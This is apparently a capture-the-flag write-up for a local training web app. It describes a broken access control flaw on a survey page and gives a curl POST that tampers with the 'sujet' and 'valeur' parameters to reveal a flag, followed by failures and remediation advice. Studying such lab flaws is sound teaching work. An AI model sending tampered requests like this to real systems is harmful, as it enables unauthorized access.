# Survey Page - Broken Access Control

## Vulnerability Type
**OWASP A01:2021 - Broken Access Control** (CWE-639: Authorization Bypass Through User-Controlled Key)

## Summary

page: `http://localhost:8080/index.php?page=survey`
commands:
```bash
curl -X POST "http://localhost:8080/?page=survey" \
     -d "sujet=42&valeur=42"
```

## Discovery

I saw that it sends the post request as

```txt
sujet=2&valeur=2
```

so i changed it to:

```txt
sujet=42&valeur=42
```

and got the flag displayed.

## using curl

```bash
curl -X POST http://localhost:8081/?page=survey \
     -d "sujet=42&valeur=42"
```

## Key Failures

1. **No input validation** – Backend accepts arbitrary numeric values without checking if they're authorized
2. **No access control** – No verification that user should submit values 42 (only 2 is expected)
3. **Information disclosure** – Flag returned when invalid parameters are submitted
4. **No user context check** – Doesn't verify if the request is from the survey owner/admin

## Remediation
1. **Validate input against whitelist** – Only accept values 1-5 or predefined survey options
2. **Check authorization** – Verify user owns or can access the survey being modified
3. **Implement server-side validation** – Never trust client-submitted values
4. **Use enum/constants** – Define allowed survey values server-side, not in frontend
5. **Log suspicious attempts** – Monitor requests with out-of-range parameters
6. **Fail securely** – Return generic error, not flag, for invalid input
7. **Hide flags from responses** – Flags should never appear in normal application flow (only in admin panels)
